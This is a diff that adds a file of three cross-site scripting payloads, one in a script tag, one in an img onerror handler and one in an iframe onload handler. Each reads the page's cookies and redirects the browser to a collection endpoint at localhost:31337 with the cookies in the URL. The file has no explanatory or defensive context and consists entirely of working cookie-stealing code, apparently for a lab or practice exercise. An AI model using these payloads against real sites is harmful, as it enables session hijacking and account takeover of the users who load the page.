@@ -1,0 +1,9 @@
+<script>
+
+    var stolenCookie = document.cookie;
+    window.location.href = "http://localhost:31337/stolen?cookies=" + stolenCookie;
+</script>
+
+<img src='#' onerror="alert(document.URL);var stolenCookie = document.cookie;window.location.href = 'http://localhost:31337/stolen?cookies=' + stolenCookie;"/>
+
+<iframe onload="alert(document.URL);var stolenCookie = document.cookie;window.location.href = 'http://localhost:31337/stolen?cookies=' + stolenCookie;"></iframe>
